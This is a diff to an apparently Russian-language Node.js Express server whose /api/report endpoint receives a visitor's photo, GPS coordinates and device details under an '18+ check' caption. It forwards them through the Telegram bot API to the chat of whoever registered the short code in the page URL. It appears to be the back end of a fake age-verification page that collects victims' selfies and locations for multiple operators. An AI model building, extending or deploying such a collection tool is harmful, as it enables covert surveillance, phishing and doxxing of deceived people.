@@ -1,4 +1,4 @@
-// === server/index.js (минималистичный под code -> chat_id) ===
+// === server/index.js (code -> chat_id, pretty /:code, понятные ошибки) ===
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
@@ -8,10 +8,11 @@ import { fileURLToPath } from 'url';
 
 // ==== ENV ====
 const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN || '';
-const STATIC_ORIGIN    = process.env.STATIC_ORIGIN || '*';
+const STATIC_ORIGIN    = (process.env.STATIC_ORIGIN || '*').trim();
 const PUBLIC_BASE      = (process.env.PUBLIC_BASE || STATIC_ORIGIN).replace(/\/+$/, '');
 const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET || '';
 const DB_PATH          = process.env.DB_PATH || './data/links.db';
+const PORT             = Number(process.env.PORT || 10000);
 
 // ==== Paths / Static ====
 const __filename = fileURLToPath(import.meta.url);
@@ -25,7 +26,7 @@ app.use(express.json({ limit: '15mb' }));
 app.use(express.urlencoded({ extended: true, limit: '15mb' }));
 
 // --- CORS
-app.use((_, res, next) => {
+app.use((req, res, next) => {
   res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
@@ -56,7 +57,7 @@ try {
 console.log('[db] using', DB_PATH);
 const db = new Database(DB_PATH);
 
-// --- single table for new scheme
+// --- table (new scheme)
 db.prepare(`
   CREATE TABLE IF NOT EXISTS user_codes (
     code       TEXT PRIMARY KEY,
@@ -64,11 +65,9 @@ db.prepare(`
     created_at INTEGER NOT NULL
   );
 `).run();
-
 db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_chat_id ON user_codes(chat_id);`).run();
-db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_created_at ON user_codes(created_at);`).run();
 
-// migrate.sql (не обязателен; если лежит рядом — применим)
+// ---- optional migrate.sql (будет выполнен, если файл есть)
 try {
   const migratePath = path.join(__dirname, 'migrate.sql');
   if (fs.existsSync(migratePath)) {
@@ -91,19 +90,16 @@ function requireAdminSecret(req, res, next) {
 function escapeHTML(s = '') {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
-
 function b64ToBuffer(dataUrl = '') {
   const i = dataUrl.indexOf('base64,');
   const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
   return Buffer.from(b64, 'base64');
 }
-
 async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
-  if (!BOT_TOKEN) throw new Error('Missing TELEGRAM_BOT_TOKEN');
+  if (!BOT_TOKEN) throw new Error('No BOT token on server');
   if (!chatId) throw new Error('Missing chat_id');
-  if (!photoBuf?.length) throw new Error('Empty photo buffer');
+  if (!photoBuf?.length) throw new Error('Empty photo');
 
-  // Node 20: fetch/FormData/Blob глобально доступны
   const form = new FormData();
   form.append('chat_id', chatId);
   form.append('caption', caption);
@@ -119,10 +115,8 @@ async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'repo
   return resp.json();
 }
 
-// ==== health ====
+// ==== health & debug ====
 app.get('/health', (_req, res) => res.json({ ok: true }));
-
-// ==== DEBUG ====
 app.get('/api/debug/db', (req, res) => {
   try {
     const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
@@ -133,7 +127,7 @@ app.get('/api/debug/db', (req, res) => {
   }
 });
 
-// ==== Admin API: register-code (code -> chatId) ====
+// ==== Admin: register-code ====
 app.post('/api/register-code', requireAdminSecret, (req, res) => {
   try {
     const { code, chatId } = req.body || {};
@@ -152,11 +146,10 @@ app.post('/api/register-code', requireAdminSecret, (req, res) => {
   }
 });
 
-// ==== Pretty URL: /:code -> index.html?code=<code> ====
+// ==== Pretty URL: /:code -> index.html?code=... ====
 app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
   const code = req.params.code.toString();
   let html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
-  // Заменяем URL на SPA с параметром code
   const injected = html.replace(
     /<head>/i,
     `<head><script>history.replaceState(null,'','/index.html?code=${code}');</script>`
@@ -165,13 +158,12 @@ app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
   res.send(injected);
 });
 
-// ==== API: report (отправка фото ТОЛЬКО владельцу code) ====
+// ==== API: report (отправка фото владельцу кода) ====
 app.post('/api/report', async (req, res) => {
   try {
-    const { userAgent, platform, iosVersion, isSafari, geo, address, photoBase64, note, code } = req.body || {};
-    if (!BOT_TOKEN)   return res.status(500).json({ ok: false, error: 'No BOT token' });
-    if (!photoBase64) return res.status(400).json({ ok: false, error: 'No photoBase64' });
-    if (!code)        return res.status(400).json({ ok: false, error: 'No code' });
+    const { userAgent, platform, iosVersion, isSafari, geo, photoBase64, note, code } = req.body || {};
+    if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
+    if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });
 
     const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?')
       .get(String(code).toUpperCase());
@@ -179,11 +171,11 @@ app.post('/api/report', async (req, res) => {
 
     const caption = [
       '<b>Новый отчёт 18+ проверка</b>',
+      `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
       `UA: <code>${escapeHTML(userAgent || '')}</code>`,
       `Platform: <code>${escapeHTML(platform || '')}</code>`,
       `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
       geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
-      address ? `Addr: <code>${escapeHTML(address)}</code>` : null,
       note ? `Note: <code>${escapeHTML(note)}</code>` : null
     ].filter(Boolean).join('\n');
 
@@ -207,7 +199,6 @@ app.use((req, res) => {
 });
 
 // ==== Start ====
-const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
   console.log(`[server] listening on :${PORT}`);
   console.log(`[server] Public dir: ${PUBLIC_DIR}`);
